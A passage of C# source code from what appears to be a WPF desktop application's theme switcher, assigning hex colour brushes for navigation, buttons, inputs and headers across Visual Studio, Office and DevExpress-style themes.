        res["PrimaryGradient"] = accentBrush;

        // TitleTextBrush — white for themes with a coloured title bar (Seven Classic), accent colour elsewhere
        res["TitleTextBrush"] = _lightTitleThemes.Contains(name) ? B("#E8F2FF") : accentBrush;
        Resources["TitleTextBrush"] = res["TitleTextBrush"];

        if (BgLogoImage != null)
            BgLogoImage.Visibility = System.Windows.Visibility.Collapsed;

        var accentHex = $"#{color.R:X2}{color.G:X2}{color.B:X2}";

        switch (name)
        {
            // ══════════════════════════════════════════════════════════════════
            // VISUAL STUDIO
            // ══════════════════════════════════════════════════════════════════
            case "VS2010":
                res["NavIconBrush"]            = B("#80A8D8");
                res["NavTextBrush"]            = B("#5080B0");
                res["NavHoverBgBrush"]         = B("#1E2240");
                res["NavHoverIconBrush"]       = B("#60A0D8");
                res["NavHoverTextBrush"]       = B("#80B8E8");
                res["NavSelBgBrush"]           = B("#2040A0");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#5E9CD3");
                res["NavSectionBrush"]         = B("#3050A0");
                res["SidebarCtrlBgBrush"]      = B("#14162A");
                res["SidebarCtrlBorderBrush"]  = B("#1E2248");
                res["SidebarCtrlTextBrush"]    = B("#7898C8");
                res["WindowBgBrush"]           = B("#1F2231");
                res["TitleBgBrush"]            = B("#2D3050");
                res["TitleBorderBrush"]        = B("#1A1C38");
                res["SectionBgBrush"]          = B("#252840");
                res["SectionBorderBrush"]      = B("#353858");
                res["ActivityBgBrush"]         = B("#1F2231");
                res["InputBgBrush"]            = B("#1A1C2E");
                res["InputBorderBrush"]        = B("#2E3258");
                res["ContentTextBrush"]        = B("#E0E8F0");
                res["LabelBrush"]              = B("#7080A0");
                res["FieldLabelBrush"]         = B("#6070A0");
                res["BtnBgBrush"]              = B("#252840");
                res["BtnBorderBrush"]          = B("#353858");
                res["BtnHoverBgBrush"]         = B("#2E3258");
                res["BtnHoverBorderBrush"]     = B("#4A5090");
                res["BtnPressedBgBrush"]       = B("#1A1C28");
                res["BtnFgBrush"]              = B("#E0E8F0");
                res["ColHeaderBgBrush"]        = B("#252840");
                res["ColHeaderFgBrush"]        = B("#6878A8");
                res["ColHeaderBorderBrush"]    = B("#505880");
                break;

            case "VS2017Blue":
                res["NavIconBrush"]            = B("#7A9ED8");
                res["NavTextBrush"]            = B("#99B8E8");
                res["NavHoverBgBrush"]         = B("#263268");
                res["NavHoverIconBrush"]       = B("#99C8F8");
                res["NavHoverTextBrush"]       = B("#C0D8FF");
                res["NavSelBgBrush"]           = B("#007ACC");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#5070B8");
                res["SidebarCtrlBgBrush"]      = B("#141B3A");
                res["SidebarCtrlBorderBrush"]  = B("#1E2850");
                res["SidebarCtrlTextBrush"]    = B("#8AA8D0");
                res["WindowBgBrush"]           = B("#2B3566");
                res["TitleBgBrush"]            = B("#1E294F");
                res["TitleBorderBrush"]        = B("#14204A");
                res["SectionBgBrush"]          = B("#344080");
                res["SectionBorderBrush"]      = B("#4050A0");
                res["ActivityBgBrush"]         = B("#2B3566");
                res["InputBgBrush"]            = B("#263270");
                res["InputBorderBrush"]        = B("#3E50A0");
                res["ContentTextBrush"]        = B("#FFFFFF");
                res["LabelBrush"]              = B("#99B0E0");
                res["FieldLabelBrush"]         = B("#80A0D8");
                res["BtnBgBrush"]              = B("#314090");
                res["BtnBorderBrush"]          = B("#4060B8");
                res["BtnHoverBgBrush"]         = B("#3A4CA0");
                res["BtnHoverBorderBrush"]     = B("#5080C8");
                res["BtnPressedBgBrush"]       = B("#242E70");
                res["BtnFgBrush"]              = B("#FFFFFF");
                res["ColHeaderBgBrush"]        = B("#2040A0");
                res["ColHeaderFgBrush"]        = B("#9ABCE8");
                res["ColHeaderBorderBrush"]    = B("#5870D8");
                break;

            case "VS2017Dark":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#999999");
                res["NavHoverBgBrush"]         = B("#1F3A5F");
                res["NavHoverIconBrush"]       = B("#AABCCC");
                res["NavHoverTextBrush"]       = B("#C8C8C8");
                res["NavSelBgBrush"]           = B("#007ACC");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#595959");
                res["SidebarCtrlBgBrush"]      = B("#1E1E1E");
                res["SidebarCtrlBorderBrush"]  = B("#3F3F46");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#1E1E1E");
                res["TitleBgBrush"]            = B("#252526");
                res["TitleBorderBrush"]        = B("#2D2D30");
                res["SectionBgBrush"]          = B("#2D2D30");
                res["SectionBorderBrush"]      = B("#3F3F46");
                res["ActivityBgBrush"]         = B("#1E1E1E");
                res["InputBgBrush"]            = B("#1E1E1E");
                res["InputBorderBrush"]        = B("#3F3F46");
                res["ContentTextBrush"]        = B("#D4D4D4");
                res["LabelBrush"]              = B("#9B9B9B");
                res["FieldLabelBrush"]         = B("#858585");
                res["BtnBgBrush"]              = B("#3C3C3C");
                res["BtnBorderBrush"]          = B("#555555");
                res["BtnHoverBgBrush"]         = B("#4A4A4A");
                res["BtnHoverBorderBrush"]     = B("#7A7A7A");
                res["BtnPressedBgBrush"]       = B("#2A2A2A");
                res["BtnFgBrush"]              = B("#D4D4D4");
                res["ColHeaderBgBrush"]        = B("#2D2D30");
                res["ColHeaderFgBrush"]        = B("#808080");
                res["ColHeaderBorderBrush"]    = B("#606068");
                break;

            case "VS2017Light":
                res["NavIconBrush"]            = B("#6D6D6D");
                res["NavTextBrush"]            = B("#444444");
                res["NavHoverBgBrush"]         = B("#DAEEFB");
                res["NavHoverIconBrush"]       = B("#007ACC");
                res["NavHoverTextBrush"]       = B("#1E1E1E");
                res["NavSelBgBrush"]           = B("#007ACC");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#8A8A8A");
                res["SidebarCtrlBgBrush"]      = B("#F0F0F0");
                res["SidebarCtrlBorderBrush"]  = B("#C8C8C8");
                res["SidebarCtrlTextBrush"]    = B("#8A8A8A");
                res["WindowBgBrush"]           = B("#F5F5F5");
                res["TitleBgBrush"]            = B("#007ACC");
                res["TitleBorderBrush"]        = B("#0062A3");
                res["SectionBgBrush"]          = B("#FFFFFF");
                res["SectionBorderBrush"]      = B("#CCCEDB");
                res["ActivityBgBrush"]         = B("#F0F0F0");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#CCCEDB");
                res["ContentTextBrush"]        = B("#1E1E1E");
                res["LabelBrush"]              = B("#444444");
                res["FieldLabelBrush"]         = B("#555555");
                res["BtnBgBrush"]              = B("#EFEFEF");
                res["BtnBorderBrush"]          = B("#A0A0A0");
                res["BtnHoverBgBrush"]         = B("#DAEEFB");
                res["BtnHoverBorderBrush"]     = B("#007ACC");
                res["BtnPressedBgBrush"]       = B("#C7E5F3");
                res["BtnFgBrush"]              = B("#1E1E1E");
                res["ColHeaderBgBrush"]        = B("#E8E8E8");
                res["ColHeaderFgBrush"]        = B("#555555");
                res["ColHeaderBorderBrush"]    = B("#C8C8C8");
                break;

            // ══════════════════════════════════════════════════════════════════
            // PREVIOUS OFFICE
            // ══════════════════════════════════════════════════════════════════
            case "Office2010Blue":
                res["NavIconBrush"]            = B("#C0D8F0");
                res["NavTextBrush"]            = B("#D8E8FF");
                res["NavHoverBgBrush"]         = B("#1A5090");
                res["NavHoverIconBrush"]       = B("#E8F4FF");
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#0A3870");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#6090C0");
                res["SidebarCtrlBgBrush"]      = B("#1458A0");
                res["SidebarCtrlBorderBrush"]  = B("#0A3870");
                res["SidebarCtrlTextBrush"]    = B("#8AB8D8");
                res["WindowBgBrush"]           = B("#D6E4F0");
                res["TitleBgBrush"]            = B("#1B5B99");
                res["TitleBorderBrush"]        = B("#0A3870");
                res["SectionBgBrush"]          = B("#EDF4FC");
                res["SectionBorderBrush"]      = B("#B0CEE4");
                res["ActivityBgBrush"]         = B("#D6E4F0");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#B0C8E0");
                res["ContentTextBrush"]        = B("#1A2B40");
                res["LabelBrush"]              = B("#3A5880");
                res["FieldLabelBrush"]         = B("#4A6898");
                res["BtnBgBrush"]              = B("#DCE8F5");
                res["BtnBorderBrush"]          = B("#8AAECC");
                res["BtnHoverBgBrush"]         = B("#C8DCF0");
                res["BtnHoverBorderBrush"]     = B("#5090C0");
                res["BtnPressedBgBrush"]       = B("#B0CCDF");
                res["BtnFgBrush"]              = B("#1A2B40");
                res["ColHeaderBgBrush"]        = B("#C0D4E8");
                res["ColHeaderFgBrush"]        = B("#1B5B99");
                res["ColHeaderBorderBrush"]    = B("#8AAED8");
                break;

            case "Office2010Black":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#C0C0C0");
                res["NavHoverBgBrush"]         = B("#2A2A50");
                res["NavHoverIconBrush"]       = B("#B0C0D8");
                res["NavHoverTextBrush"]       = B("#E0E0F0");
                res["NavSelBgBrush"]           = B("#4A7FFF");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#606060");
                res["SidebarCtrlBgBrush"]      = B("#1E1E1E");
                res["SidebarCtrlBorderBrush"]  = B("#383838");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#3A3A3A");
                res["TitleBgBrush"]            = B("#1A1A1A");
                res["TitleBorderBrush"]        = B("#101010");
                res["SectionBgBrush"]          = B("#454545");
                res["SectionBorderBrush"]      = B("#555555");
                res["ActivityBgBrush"]         = B("#3A3A3A");
                res["InputBgBrush"]            = B("#2A2A2A");
                res["InputBorderBrush"]        = B("#505050");
                res["ContentTextBrush"]        = B("#E8E8E8");
                res["LabelBrush"]              = B("#B0B0B0");
                res["FieldLabelBrush"]         = B("#989898");
                res["BtnBgBrush"]              = B("#404040");
                res["BtnBorderBrush"]          = B("#606060");
                res["BtnHoverBgBrush"]         = B("#4A4A4A");
                res["BtnHoverBorderBrush"]     = B("#808080");
                res["BtnPressedBgBrush"]       = B("#303030");
                res["BtnFgBrush"]              = B("#E8E8E8");
                res["ColHeaderBgBrush"]        = B("#333333");
                res["ColHeaderFgBrush"]        = B("#909090");
                res["ColHeaderBorderBrush"]    = B("#787878");
                break;

            case "Office2010Silver":
                res["NavIconBrush"]            = B("#404858");
                res["NavTextBrush"]            = B("#383E50");
                res["NavHoverBgBrush"]         = B("#C8CFDC");
                res["NavHoverIconBrush"]       = B("#2A3048");
                res["NavHoverTextBrush"]       = B("#1A1C2E");
                res["NavSelBgBrush"]           = B("#4070B0");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#707888");
                res["SidebarCtrlBgBrush"]      = B("#B0B8C8");
                res["SidebarCtrlBorderBrush"]  = B("#8890A0");
                res["SidebarCtrlTextBrush"]    = B("#505870");
                res["WindowBgBrush"]           = B("#DFE0E4");
                res["TitleBgBrush"]            = B("#5A6070");
                res["TitleBorderBrush"]        = B("#484E5C");
                res["SectionBgBrush"]          = B("#EEF0F4");
                res["SectionBorderBrush"]      = B("#C8CDD8");
                res["ActivityBgBrush"]         = B("#DFE0E4");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#B8BCC8");
                res["ContentTextBrush"]        = B("#1A1C2E");
                res["LabelBrush"]              = B("#505870");
                res["FieldLabelBrush"]         = B("#606878");
                res["BtnBgBrush"]              = B("#E2E4EA");
                res["BtnBorderBrush"]          = B("#A8ADB8");
                res["BtnHoverBgBrush"]         = B("#D0D4DC");
                res["BtnHoverBorderBrush"]     = B("#808898");
                res["BtnPressedBgBrush"]       = B("#C4C8D4");
                res["BtnFgBrush"]              = B("#1A1C2E");
                res["AlternatingRowBgBrush"]   = B("#E8E9ED");
                res["RowHoverBgBrush"]         = B("#D8E2F0");
                res["RowSelBgBrush"]           = B("#B0C4E0");
                res["RowSelTextBrush"]         = B("#0E1A30");
                res["RowSelBorderBrush"]       = B("#4070B0");
                res["ColHeaderBgBrush"]        = B("#C8CAD4");
                res["ColHeaderFgBrush"]        = B("#1A1C2E");
                res["ColHeaderBorderBrush"]    = B("#A0A4B0");
                break;

            // ══════════════════════════════════════════════════════════════════
            // OFFICE 2019
            // ══════════════════════════════════════════════════════════════════
            case "Office2019Colorful":
                res["NavIconBrush"]            = B("#BDD0F0");
                res["NavTextBrush"]            = B("#D0E0FF");
                res["NavHoverBgBrush"]         = B("#244A88");
                res["NavHoverIconBrush"]       = B("#E8F0FF");
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#1A3A70");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#8090B8");
                res["SidebarCtrlBgBrush"]      = B("#2050A0");
                res["SidebarCtrlBorderBrush"]  = B("#1A3A80");
                res["SidebarCtrlTextBrush"]    = B("#8AB0E0");
                res["WindowBgBrush"]           = B("#EDEEF0");
                res["TitleBgBrush"]            = B("#2B579A");
                res["TitleBorderBrush"]        = B("#1E4080");
                res["SectionBgBrush"]          = B("#FFFFFF");
                res["SectionBorderBrush"]      = B("#D8DCEA");
                res["ActivityBgBrush"]         = B("#EDEEF0");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#D0D4DC");
                res["ContentTextBrush"]        = B("#262626");
                res["LabelBrush"]              = B("#504E4E");
                res["FieldLabelBrush"]         = B("#666060");
                res["BtnBgBrush"]              = B("#EDEDED");
                res["BtnBorderBrush"]          = B("#C0C4CC");
                res["BtnHoverBgBrush"]         = B("#DBE8FB");
                res["BtnHoverBorderBrush"]     = B("#2B579A");
                res["BtnPressedBgBrush"]       = B("#C8DAF8");
                res["BtnFgBrush"]              = B("#262626");
                res["ColHeaderBgBrush"]        = B("#D0D8EA");
                res["ColHeaderFgBrush"]        = B("#2B579A");
                res["ColHeaderBorderBrush"]    = B("#B0C0D8");
                break;

            case "Office2019Black":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#A0A8B8");
                res["NavHoverBgBrush"]         = B("#202040");
                res["NavHoverIconBrush"]       = B("#A0B8D8");
                res["NavHoverTextBrush"]       = B("#C0D0E8");
                res["NavSelBgBrush"]           = B("#3060A0");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#606060");
                res["SidebarCtrlBgBrush"]      = B("#101010");
                res["SidebarCtrlBorderBrush"]  = B("#2A2A2A");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#1D1D1D");
                res["TitleBgBrush"]            = B("#121212");
                res["TitleBorderBrush"]        = B("#080808");
                res["SectionBgBrush"]          = B("#232323");
                res["SectionBorderBrush"]      = B("#363636");
                res["ActivityBgBrush"]         = B("#1D1D1D");
                res["InputBgBrush"]            = B("#1D1D1D");
                res["InputBorderBrush"]        = B("#404040");
                res["ContentTextBrush"]        = B("#D0D0D0");
                res["LabelBrush"]              = B("#909090");
                res["FieldLabelBrush"]         = B("#808080");
                res["BtnBgBrush"]              = B("#2A2A2A");
                res["BtnBorderBrush"]          = B("#484848");
                res["BtnHoverBgBrush"]         = B("#303060");
                res["BtnHoverBorderBrush"]     = B("#6090D0");
                res["BtnPressedBgBrush"]       = B("#1E1E1E");
                res["BtnFgBrush"]              = B("#D0D0D0");
                res["ColHeaderBgBrush"]        = B("#252525");
                res["ColHeaderFgBrush"]        = B("#707070");
                res["ColHeaderBorderBrush"]    = B("#656565");
                break;

            case "Office2019White":
                res["NavIconBrush"]            = B("#BDD0F0");
                res["NavTextBrush"]            = B("#D0E0FF");
                res["NavHoverBgBrush"]         = B("#244A88");
                res["NavHoverIconBrush"]       = B("#E8F0FF");
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#1A3A70");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#7090B8");
                res["SidebarCtrlBgBrush"]      = B("#2050A0");
                res["SidebarCtrlBorderBrush"]  = B("#1A3A80");
                res["SidebarCtrlTextBrush"]    = B("#8AB0E0");
                res["WindowBgBrush"]           = B("#FFFFFF");
                res["TitleBgBrush"]            = B("#2B579A");
                res["TitleBorderBrush"]        = B("#1E4080");
                res["SectionBgBrush"]          = B("#F8F8F8");
                res["SectionBorderBrush"]      = B("#E0E4E8");
                res["ActivityBgBrush"]         = B("#F0F0F0");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#D0D4D8");
                res["ContentTextBrush"]        = B("#262626");
                res["LabelBrush"]              = B("#505050");
                res["FieldLabelBrush"]         = B("#606060");
                res["BtnBgBrush"]              = B("#F3F3F3");
                res["BtnBorderBrush"]          = B("#C0C4C8");
                res["BtnHoverBgBrush"]         = B("#DBE8FB");
                res["BtnHoverBorderBrush"]     = B("#2B579A");
                res["BtnPressedBgBrush"]       = B("#C8DAF8");
                res["BtnFgBrush"]              = B("#262626");
                res["ColHeaderBgBrush"]        = B("#E8EBF0");
                res["ColHeaderFgBrush"]        = B("#2B579A");
                res["ColHeaderBorderBrush"]    = B("#C0C4C8");
                break;

            case "Office2019DarkGray":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#A0A8B8");
                res["NavHoverBgBrush"]         = B("#1E2850");
                res["NavHoverIconBrush"]       = B("#A0B8D8");
                res["NavHoverTextBrush"]       = B("#C0D0E8");
                res["NavSelBgBrush"]           = B("#2B579A");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#686868");
                res["SidebarCtrlBgBrush"]      = B("#1E1E1E");
                res["SidebarCtrlBorderBrush"]  = B("#383838");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#2D2D2D");
                res["TitleBgBrush"]            = B("#333333");
                res["TitleBorderBrush"]        = B("#222222");
                res["SectionBgBrush"]          = B("#333333");
                res["SectionBorderBrush"]      = B("#484848");
                res["ActivityBgBrush"]         = B("#2D2D2D");
                res["InputBgBrush"]            = B("#2D2D2D");
                res["InputBorderBrush"]        = B("#484848");
                res["ContentTextBrush"]        = B("#D0D0D0");
                res["LabelBrush"]              = B("#909090");
                res["FieldLabelBrush"]         = B("#808080");
                res["BtnBgBrush"]              = B("#3A3A3A");
                res["BtnBorderBrush"]          = B("#555555");
                res["BtnHoverBgBrush"]         = B("#3D5090");
                res["BtnHoverBorderBrush"]     = B("#6090D0");
                res["BtnPressedBgBrush"]       = B("#252525");
                res["BtnFgBrush"]              = B("#D0D0D0");
                res["ColHeaderBgBrush"]        = B("#333333");
                res["ColHeaderFgBrush"]        = B("#909090");
                res["ColHeaderBorderBrush"]    = B("#787878");
                break;

            // ══════════════════════════════════════════════════════════════════
            // OFFICE 2016
            // ══════════════════════════════════════════════════════════════════
            case "Office2016Colorful":
                res["NavIconBrush"]            = B("#C0D4F8");
                res["NavTextBrush"]            = B("#D8E8FF");
                res["NavHoverBgBrush"]         = B("#1F549A");
                res["NavHoverIconBrush"]       = B("#E8F2FF");
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#144888");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#8098C0");
                res["SidebarCtrlBgBrush"]      = B("#1A509A");
                res["SidebarCtrlBorderBrush"]  = B("#113C78");
                res["SidebarCtrlTextBrush"]    = B("#80B0E0");
                res["WindowBgBrush"]           = B("#E8EEF8");
                res["TitleBgBrush"]            = B("#2B6CB0");
                res["TitleBorderBrush"]        = B("#1A509A");
                res["SectionBgBrush"]          = B("#FFFFFF");
                res["SectionBorderBrush"]      = B("#D4DCF0");
                res["ActivityBgBrush"]         = B("#E8EEF8");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#C8D4E8");
                res["ContentTextBrush"]        = B("#262626");
                res["LabelBrush"]              = B("#484E60");
                res["FieldLabelBrush"]         = B("#585E70");
                res["BtnBgBrush"]              = B("#E4ECF8");
                res["BtnBorderBrush"]          = B("#A8B8D8");
                res["BtnHoverBgBrush"]         = B("#D0DEF8");
                res["BtnHoverBorderBrush"]     = B("#2B6CB0");
                res["BtnPressedBgBrush"]       = B("#C0D0F0");
                res["BtnFgBrush"]              = B("#262626");
                res["ColHeaderBgBrush"]        = B("#D0DCEE");
                res["ColHeaderFgBrush"]        = B("#2B6CB0");
                res["ColHeaderBorderBrush"]    = B("#A8B8D8");
                break;

            case "Office2016DarkGraySE":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#A0A8B8");
                res["NavHoverBgBrush"]         = B("#202840");
                res["NavHoverIconBrush"]       = B("#A0B8D8");
                res["NavHoverTextBrush"]       = B("#C0D0E8");
                res["NavSelBgBrush"]           = B("#3060A8");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#686868");
                res["SidebarCtrlBgBrush"]      = B("#1E1E1E");
                res["SidebarCtrlBorderBrush"]  = B("#353535");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#2F2F2F");
                res["TitleBgBrush"]            = B("#3E3E3E");
                res["TitleBorderBrush"]        = B("#282828");
                res["SectionBgBrush"]          = B("#3A3A3A");
                res["SectionBorderBrush"]      = B("#505050");
                res["ActivityBgBrush"]         = B("#2F2F2F");
                res["InputBgBrush"]            = B("#2A2A2A");
                res["InputBorderBrush"]        = B("#505050");
                res["ContentTextBrush"]        = B("#D0D0D0");
                res["LabelBrush"]              = B("#909090");
                res["FieldLabelBrush"]         = B("#808080");
                res["BtnBgBrush"]              = B("#3C3C3C");
                res["BtnBorderBrush"]          = B("#565656");
                res["BtnHoverBgBrush"]         = B("#4A6090");
                res["BtnHoverBorderBrush"]     = B("#6090C8");
                res["BtnPressedBgBrush"]       = B("#282828");
                res["BtnFgBrush"]              = B("#D0D0D0");
                res["ColHeaderBgBrush"]        = B("#3A3A3A");
                res["ColHeaderFgBrush"]        = B("#808080");
                res["ColHeaderBorderBrush"]    = B("#787878");
                break;

            case "Office2016Black":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#A0A8B8");
                res["NavHoverBgBrush"]         = B("#18203A");
                res["NavHoverIconBrush"]       = B("#A0B8D8");
                res["NavHoverTextBrush"]       = B("#C0D0E8");
                res["NavSelBgBrush"]           = B("#2860A8");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#606060");
                res["SidebarCtrlBgBrush"]      = B("#0E0E0E");
                res["SidebarCtrlBorderBrush"]  = B("#282828");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#1A1A1A");
                res["TitleBgBrush"]            = B("#0D0D0D");
                res["TitleBorderBrush"]        = B("#050505");
                res["SectionBgBrush"]          = B("#222222");
                res["SectionBorderBrush"]      = B("#363636");
                res["ActivityBgBrush"]         = B("#1A1A1A");
                res["InputBgBrush"]            = B("#1A1A1A");
                res["InputBorderBrush"]        = B("#3A3A3A");
                res["ContentTextBrush"]        = B("#D0D0D0");
                res["LabelBrush"]              = B("#909090");
                res["FieldLabelBrush"]         = B("#808080");
                res["BtnBgBrush"]              = B("#282828");
                res["BtnBorderBrush"]          = B("#484848");
                res["BtnHoverBgBrush"]         = B("#2850A0");
                res["BtnHoverBorderBrush"]     = B("#5080C8");
                res["BtnPressedBgBrush"]       = B("#141414");
                res["BtnFgBrush"]              = B("#D0D0D0");
                res["ColHeaderBgBrush"]        = B("#222222");
                res["ColHeaderFgBrush"]        = B("#707070");
                res["ColHeaderBorderBrush"]    = B("#606060");
                break;

            // ══════════════════════════════════════════════════════════════════
            // OFFICE 2013
            // ══════════════════════════════════════════════════════════════════
            case "Office2013":
                res["NavIconBrush"]            = B("#BDD4F8");
                res["NavTextBrush"]            = B("#D4E8FF");
                res["NavHoverBgBrush"]         = B("#1D60A8");
                res["NavHoverIconBrush"]       = B("#E8F4FF");
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#0E4A90");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#7098C0");
                res["SidebarCtrlBgBrush"]      = B("#1860A8");
                res["SidebarCtrlBorderBrush"]  = B("#0E4A90");
                res["SidebarCtrlTextBrush"]    = B("#80B8E0");
                res["WindowBgBrush"]           = B("#FFFFFF");
                res["TitleBgBrush"]            = B("#2972BF");
                res["TitleBorderBrush"]        = B("#1A5AA0");
                res["SectionBgBrush"]          = B("#F6F6F6");
                res["SectionBorderBrush"]      = B("#E0E4EA");
                res["ActivityBgBrush"]         = B("#F0F4FA");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#D0D8E4");
                res["ContentTextBrush"]        = B("#262626");
                res["LabelBrush"]              = B("#505060");
                res["FieldLabelBrush"]         = B("#606070");
                res["BtnBgBrush"]              = B("#F0F4FC");
                res["BtnBorderBrush"]          = B("#B8C8E0");
                res["BtnHoverBgBrush"]         = B("#DCE8FC");
                res["BtnHoverBorderBrush"]     = B("#2972BF");
                res["BtnPressedBgBrush"]       = B("#C8D8F4");
                res["BtnFgBrush"]              = B("#262626");
                res["ColHeaderBgBrush"]        = B("#E8EFF8");
                res["ColHeaderFgBrush"]        = B("#2972BF");
                res["ColHeaderBorderBrush"]    = B("#C0D0E0");
                break;

            case "Office2013DarkGray":
                res["NavIconBrush"]            = B("#C0D0E8");
                res["NavTextBrush"]            = B("#B0B8C8");
                res["NavHoverBgBrush"]         = B("#202840");
                res["NavHoverIconBrush"]       = B("#C0D0E8");
                res["NavHoverTextBrush"]       = B("#E0E8F8");
                res["NavSelBgBrush"]           = B("#1BBBF0");
                res["NavSelTextBrush"]         = B("#0A1520");
                res["NavSelIconBrush"]         = B("#0A1520");
                res["NavSectionBrush"]         = B("#686878");
                res["SidebarCtrlBgBrush"]      = B("#282828");
                res["SidebarCtrlBorderBrush"]  = B("#404040");
                res["SidebarCtrlTextBrush"]    = B("#909090");
                res["WindowBgBrush"]           = B("#414141");
                res["TitleBgBrush"]            = B("#3E3E3E");
                res["TitleBorderBrush"]        = B("#2A2A2A");
                res["SectionBgBrush"]          = B("#4C4C4C");
                res["SectionBorderBrush"]      = B("#606060");
                res["ActivityBgBrush"]         = B("#414141");
                res["InputBgBrush"]            = B("#3A3A3A");
                res["InputBorderBrush"]        = B("#585858");
                res["ContentTextBrush"]        = B("#EBEBEB");
                res["LabelBrush"]              = B("#B0B0B0");
                res["FieldLabelBrush"]         = B("#A0A0A0");
                res["BtnBgBrush"]              = B("#4C4C4C");
                res["BtnBorderBrush"]          = B("#686868");
                res["BtnHoverBgBrush"]         = B("#3A5080");
                res["BtnHoverBorderBrush"]     = B("#5898C8");
                res["BtnPressedBgBrush"]       = B("#303030");
                res["BtnFgBrush"]              = B("#EBEBEB");
                res["ColHeaderBgBrush"]        = B("#4C4C4C");
                res["ColHeaderFgBrush"]        = B("#B0B0B0");
                res["ColHeaderBorderBrush"]    = B("#888888");
                break;

            // ══════════════════════════════════════════════════════════════════
            // DEFAULT (DevExpress)
            // ══════════════════════════════════════════════════════════════════
            case "DXStyle":
                res["NavIconBrush"]            = B("#B8CCE8");
                res["NavTextBrush"]            = B("#D0E0F8");
                res["NavHoverBgBrush"]         = B("#2E5890");
                res["NavHoverIconBrush"]       = B("#E8F2FF");
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#1C4070");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#7090B8");
                res["SidebarCtrlBgBrush"]      = B("#2858A0");
                res["SidebarCtrlBorderBrush"]  = B("#1C4070");
                res["SidebarCtrlTextBrush"]    = B("#80B0D8");
                res["WindowBgBrush"]           = B("#E5ECF6");
                res["TitleBgBrush"]            = B("#3E6FA8");
                res["TitleBorderBrush"]        = B("#2C5090");
                res["SectionBgBrush"]          = B("#EFF4FC");
                res["SectionBorderBrush"]      = B("#C8D8F0");
                res["ActivityBgBrush"]         = B("#E5ECF6");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#C0D0E8");
                res["ContentTextBrush"]        = B("#1A1A2E");
                res["LabelBrush"]              = B("#485870");
                res["FieldLabelBrush"]         = B("#586880");
                res["BtnBgBrush"]              = B("#E0EAF8");
                res["BtnBorderBrush"]          = B("#A0B8D8");
                res["BtnHoverBgBrush"]         = B("#CCE0F8");
                res["BtnHoverBorderBrush"]     = B("#3E6FA8");
                res["BtnPressedBgBrush"]       = B("#B8D0F0");
